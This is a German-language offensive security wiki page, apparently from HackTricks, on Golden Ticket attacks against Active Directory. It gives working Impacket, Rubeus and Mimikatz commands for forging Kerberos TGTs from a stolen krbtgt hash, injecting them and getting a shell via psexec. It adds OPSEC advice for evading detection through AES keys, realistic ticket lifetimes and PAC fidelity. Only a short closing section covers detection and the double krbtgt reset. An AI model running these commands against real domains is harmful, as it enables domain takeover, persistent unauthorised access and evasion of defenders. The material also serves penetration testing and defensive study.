# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Ein **Golden Ticket**-Angriff besteht in der **Erstellung eines legitimen Ticket Granting Ticket (TGT), das einen beliebigen Benutzer imitiert**, durch die Verwendung des **NTLM-Hashs des krbtgt-Kontos der Active Directory (AD)**. Diese Technik ist besonders vorteilhaft, weil sie **Zugriff auf jeden Dienst oder jede Maschine** innerhalb der Domäne als der imitierte Benutzer ermöglicht. Es ist entscheidend, sich daran zu erinnern, dass die **Anmeldedaten des krbtgt-Kontos nie automatisch aktualisiert werden**.

Um den **NTLM-Hash** des krbtgt-Kontos zu **erhalten**, können verschiedene Methoden eingesetzt werden. Er kann aus dem Prozess **Local Security Authority Subsystem Service (LSASS)** oder aus der **NT Directory Services (NTDS.dit)**-Datei extrahiert werden, die sich auf einem beliebigen Domain Controller (DC) innerhalb der Domäne befindet. Darüber hinaus ist die **Ausführung eines DCsync-Angriffs** eine weitere Strategie, um diesen NTLM-Hash zu erhalten; dies kann mit Tools wie dem **lsadump::dcsync-Modul** in Mimikatz oder dem **secretsdump.py-Skript** von Impacket durchgeführt werden. Wichtig ist zu betonen, dass für diese Operationen in der Regel **Domain-Admin-Rechte oder ein vergleichbares Zugriffslevel erforderlich** sind.

Obwohl der NTLM-Hash eine praktikable Methode für diesen Zweck darstellt, wird aus Gründen der operationalen Sicherheit **dringend empfohlen**, Tickets mit den **Advanced Encryption Standard (AES) Kerberos-Schlüsseln (AES128 und AES256)** zu fälschen. Dies ist in modernen Domänen noch wichtiger, da die **Verwendung von RC4 schrittweise abgeschafft wird** und in der Kerberos-Telemetrie deutlich stärker auffällt.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Moderne Notizen zum Ticket Crafting

Wenn möglich, **frage zuerst LDAP und SYSVOL ab** und forge dann das Ticket mit der echten Domain-Policy und den User-PAC-Werten, statt sie manuell zu erfinden:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` fragt den DC nach den Benutzer-, Gruppen-, NetBIOS- und Policy-Daten, die zum Aufbau eines realistischeren PAC verwendet werden.
- `/printcmd` gibt eine Offline-Commandline aus, die die abgerufenen PAC-Felder enthält; das ist nützlich, wenn du später dasselbe Ticket erneut fälschen willst, ohne LDAP noch einmal zu berühren.
- `/extendedupndns` fügt die neueren `UpnDns`-PAC-Elemente hinzu, die `samAccountName` und die Account-SID enthalten.
- `/oldpac` entfernt die neueren `Requestor`- und `Attributes`-PAC-Buffers; das ist hauptsächlich nützlich für Kompatibilitätstests gegen ältere Umgebungen, nicht für standardmäßiges Tradecraft.

Unter Linux unterstützen aktuelle Impacket-Versionen außerdem das Hinzufügen der neueren PAC-Strukturen und das Setzen einer realistischen Gültigkeitsdauer:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` ist in **Stunden**. Der Standardwert sind **10 Jahre**, was auffällig ist.
- `-extra-pac` fügt die neueren `UPN_DNS` PAC-Informationen hinzu.
- `-old-pac` erzwingt das alte PAC-Layout.
- `-extra-sid` ist nützlich, wenn das PAC zusätzliche SIDs benötigt (zum Beispiel in Child-to-Parent-Eskalationsszenarien, die in [SID-History Injection](sid-history-injection.md) behandelt werden).

**Sobald** du den **golden Ticket injiziert** hast, kannst du auf die freigegebenen Dateien **(C$)** zugreifen und Dienste sowie WMI ausführen. Du könntest also **psexec** oder **wmiexec** verwenden, um eine Shell zu erhalten (es sieht so aus, als ob du über winrm keine Shell bekommen kannst).

### Bypassing common detections

Die häufigste Methode, ein golden ticket zu erkennen, ist das **Inspektieren von Kerberos-Traffic** auf dem Wire. Standardmäßig **signiert Mimikatz das TGT für 10 Jahre**, was bei nachfolgenden TGS-Requests, die damit gemacht werden, als Anomalie auffallen wird.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Verwende die Parameter `/startoffset`, `/endin` und `/renewmax`, um den Start-Offset, die Dauer und die maximale Anzahl an Erneuerungen zu steuern (alles in Minuten).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Leider wird die Lebensdauer des TGT nicht in 4769 protokolliert, daher findest du diese Information nicht in den Windows-Ereignisprotokollen. Was du jedoch korrelieren kannst, ist **4769's ohne ein vorheriges 4768** zu sehen. Es ist **nicht möglich, ein TGS ohne ein TGT anzufordern**, und wenn es keinen Nachweis dafür gibt, dass ein TGT ausgestellt wurde, können wir daraus schließen, dass es offline gefälscht wurde.

In **neueren Windows-Builds** stellen die Event IDs **4768** und **4769** auch deutlich bessere **Encryption-Type-Telemetrie** bereit. Ein gefälschtes TGT/TGS mit **RC4 (`0x17`)** in einer Domäne, in der `krbtgt`, Clients und Services bereits AES-Keys haben, ist viel leichter zu erkennen als noch vor ein paar Jahren. Das ist ein weiterer Grund, **AES-backed Golden Tickets** zu bevorzugen und die normale Kerberos-Policy der Domäne so genau wie möglich zu imitieren.

Ein weiteres OPSEC-Problem ist die **PAC-Fidelity**. Tickets mit unmöglichen Gruppenmitgliedschaften, fehlenden neueren PAC-Buffern oder Account-Metadaten, die nicht zu LDAP passen, sind leichter zu erkennen, wenn Verteidiger den PAC-Inhalt gegen AD-Daten validieren. Wenn du ein TGT brauchst, das aussieht, als wäre es wirklich von einem DC ausgestellt worden, schau dir an:

{{#ref}}
diamond-ticket.md
{{#endref}}

Es gibt auch **umgebungsbedingte Grenzen** für Persistenz. Das Konto `krbtgt` hat eine **Passwort-Historie von 2**, daher kann ein gefälschtes TGT über den **ersten** `krbtgt`-Reset hinweg gültig bleiben, wenn es mit dem vorherigen Key signiert wurde. Deshalb machen Verteidiger Golden Tickets ungültig, indem sie `krbtgt` **zweimal zurücksetzen** und zwischen den Resets mindestens die maximale Ticket-Lebensdauer der Domäne abwarten.

Um diese **Erkennung zu umgehen**, schau dir die diamond tickets an.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Andere kleine Tricks, die Verteidiger einsetzen können, sind **Alerts auf 4769's für sensible Benutzer** wie das standardmäßige Domänen-Administratorkonto sowie Alerts auf **RC4-Nutzung für `krbtgt`** in Domänen, die normalerweise AES-Tickets ausstellen.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
